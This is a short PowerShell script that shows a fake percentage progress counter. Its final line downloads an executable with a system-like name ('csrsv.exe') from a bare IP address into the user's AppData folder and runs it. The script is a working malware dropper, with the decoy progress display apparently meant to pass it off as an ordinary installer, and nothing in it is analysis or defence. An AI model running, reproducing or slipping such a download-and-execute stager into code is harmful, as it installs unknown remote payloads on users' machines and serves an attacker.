
for ($a=0; $a -le 100; $a++) {
  Write-Host -NoNewLine "`r$a% complete"
  Start-Sleep -Milliseconds 10
}
Write-Host ""
(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

